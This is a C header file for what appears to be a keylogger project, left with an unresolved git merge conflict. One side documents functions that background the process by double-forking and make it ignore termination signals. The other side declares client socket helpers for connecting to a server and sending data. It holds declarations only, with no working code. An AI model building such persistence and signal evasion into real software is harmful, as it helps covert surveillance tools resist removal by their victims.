#pragma once

#include <netinet/in.h>  // sockaddr_in
#include <stdio.h>       // FILE

#include "keylogger.h"

/**
<<<<<<< HEAD
 * Background a process
 *
 * Fork a process twice, meanwhile changing the working directory,
 * file creation permissions, and calling a function to ignore
 * standard process termination signals. At the end of the process,
 * both parent processes will have exited and the grandchild process
 * will have a new process group ID, continuing the program alone,
 * unable to recieve signals sent to the grandparent process.
 * 
 * Does not return anything.
 *
 * **/
void background_process(void);

/**
 * Redirect common termination signals
 *
 * Redirect the default implementation of SIGTERM, SIGINT,SIGHUP,
 * and SIGABRT to a custom signal handling function which ignores
 * the termination signals until enough individual signals are sent.
 * 
 * Does not return anything.
 *
 * **/
void immortalize(void);

/**
 * Ignore a signal until a global counter is high enough
 *
 * Completely ignore a recieved signal until five signals are sent.
 * If more than 5 signals are sent, raise SIGKILL and end the program.
 * 
 * @param signal An integer corresponding to the signal code
 *  of the signal being handled
 * 
 * Does not return anything.
 * 
 * **/
void shutdown_signal(int signal);

=======
 * Attempt to connect to a server on a given socket.
 *
 * Given an unconnected socket and a server address/port, attempt to connect to
 * a server. If successful, the socket descriptor client_socket can be used to
 * communicate with the server. If not, print an error message and exit without
 * returning from the function.
 *
 * @param client_socket The client's socket descriptor used for the connection.
 * @param server_addr The IPv4 socket address and port of the server.
 */
void try_connect(int client_socket, struct sockaddr_in server_addr);

/**
 * Get a file pointer for a given socket descriptor.
 *
 * Given a socket descriptor used by the client, create and return a file
 * pointer corresponding to that descriptor. This can be used with high-level
 * functions in stdio for convenience. In the event of an error in opening the
 * file stream, print an error message and exit the program, in which case this
 * function does not return.
 *
 * @param client_socket The socket descriptor to generate the file stream for.
 * @return A file pointer corresponding to client_socket.
 */
FILE* get_socket_file(int client_socket);

/**
 * Send and receive a line of text with the echo server.
 *
 * Given a file pointer corresponding to the client's connection with the
 * server, read a single line of text from standard input and send it to the
 * server. Then, receive the response back and print it to standard output. In
 * the event that an error occurs when attempting to send the text to the
 * server, print an error message and exit the program, in which case this
 * function does not return. Otherwise, return an integer corresponding to
 * success or a possible error in reading text from standard input or from the
 * server (which may be an end-of-file status).
 *
 * @param socket_file The file stream used in connection with the server.
 * @return 0 if the entire process succeeded, and -1 if there was an error
 * (which may be EOF).
 */
int send_data(FILE* socket_file);

void background_process(void);

/**
 * Add docstring here
 */
void background_process(void);

/**
 * Add docstring here
 */
void immortalize(void);

/**
 * Add docstring here
 */
void shutdown_signal(int);
>>>>>>> a874b316122f8c7b4f631b71f90f047a50cbbdd4
